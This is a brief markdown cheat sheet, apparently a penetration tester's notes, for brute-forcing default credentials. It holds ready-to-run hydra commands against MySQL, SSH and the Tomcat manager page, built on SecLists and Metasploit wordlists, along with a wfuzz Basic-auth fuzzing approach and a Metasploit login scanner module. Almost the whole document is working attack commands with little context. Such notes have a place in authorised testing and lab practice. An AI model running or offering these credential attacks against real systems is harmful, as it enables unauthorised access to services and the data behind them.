# brute force default credentials

## mysql
```bash
hydra $IP mysql -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt -t 1
```

## ssh
```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -e nsr -t 1 $IP ssh
```

## tomcat
colon separated: /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
-e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
-s PORT   if the service is on a different default port, define it here
```bash
hydra -s 8080 -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt $IP http-get /manager/html
```

try more than just the default colon separated default creds from seclists.
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt http-get://$IP/manager/html
```

### wfuzz
header `Authorization: Basic FUZZ`
/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist_base64encoded.txt

### metasploit
auxiliary/scanner/http/tomcat_mgr_login
